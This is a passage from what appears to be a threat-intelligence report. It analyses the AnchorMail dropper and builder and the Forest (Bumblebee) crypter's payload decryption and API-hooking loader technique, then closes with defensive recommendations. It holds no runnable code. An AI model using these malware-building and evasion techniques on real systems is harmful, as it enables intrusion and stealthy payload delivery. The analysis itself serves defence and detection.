<p>In the case of the AnchorMail sample, the analyzed Dropper takes the form of a WinRAR self-extracting archive (SFX) which extracts a collection of files, including script and executable files, to the directory <strong>C:\windows\tasks</strong> and then executes the first script file. One of the scripts is responsible for executing the AnchorMail builder tool, named <strong>buildDelegate_x64.exe</strong>. A text file named <strong>conf.txt</strong> is included with the dropped files and is passed to the builder as a parameter. This text file contains the desired configuration for the AnchorMail malware. The builder parses the configuration file and uses the contents to build a configuration data block for AnchorMail which it encrypts and then injects into a template DLL for the malware. The configured AnchorMail binary is then written to disk with the filename <strong>delegat.dll</strong>.</p>
<p>The dropper then executes the generated <strong>delegat.dll</strong> binary using the in-built Windows rundll32 command, and a second script is also executed which deletes the previously dropped files.</p>
<p>Further details about the dropper and builder tool are presented below.</p>

<p>This script executes the file <strong>buildDelegate_x64.exe</strong> with files <strong>conf.txt</strong>, <strong>delegate_x64.dll</strong> and <strong>delegat.dll</strong> passed as parameters.</p>
<p>The executable file <strong>buildDelegate_x64.exe</strong> is a builder tool for the AnchorMail malware and designed to inject a compiled template binary with specified configuration values. The builder parses the contents of <strong>conf.txt</strong>, and uses them to construct a configuration block for AnchorMail.</p>
<p>In this instance, conf.txt contains the following contents:</p>
<p><code>period=10<br>

<p>The script then executes the generated DLL, <strong>delegat.dll</strong>, using the in-built Windows rundll32 command.</p>

<h3>Forest crypter loads CobaltStrike, Bumblebee</h3>
<p>The Forest crypter, also known as Bumblebee loader, is a loader/crypter associated with ITG23 that has been observed in the wild since April 2022. It has so far primarily been used with the <a href="https://elis531989.medium.com/the-chronicles-of-bumblebee-the-hook-the-bee-and-the-trickbot-connection-686379311056" target="_blank" rel="noopener nofollow"  target="_blank" rel="noopener nofollow" >Bumblebee malware</a>, but samples have also been found loading CobaltStrike, such as the one identified above in Campaign #5.</p>
<p>Forest crypter stores its payload in multiple chunks across the data sections of the binary. Each chunk of data is decrypted and combined together. The constructed data is then decrypted using XOR and a generated key, and then goes through another round of unpacking to generate the final payload binary.</p>
<p>The loader is capable of executing both shellcode and PE payloads, with shellcode payloads executed directly and PE payloads executed indirectly via a hooking technique. The loader installs hooks within the library functions NtOpenFile, NtCreateSection and NtMapViewOfSection, such that when these APIs are called the loader&rsquo;s own functions will be executed instead. The loader will then attempt to load the library &lsquo;gdiplus.dll&rsquo; using the LoadLibraryW API, which in turn calls the abovementioned NT APIs and triggers the hooks. The hook functions copy the unpacked payload into a newly created section and return the base address to LoadLibraryW, which proceeds to load the malicious payload thinking it is the legitimate gdiplus.dll.</p>

<h2>Recommendations</h2>
<ul>
<li>Ensure anti-virus software and associated files are up to date.</li>
<li>Search for existing signs of the indicated IOCs in your environment.</li>
<li>Consider blocking and or setting up detection for all URL and IP-based IOCs.</li>
<li>Keep applications and operating systems running at the current released patch level.</li>
<li>Do not install unapproved apps on a device that has access to the corporate network.</li>
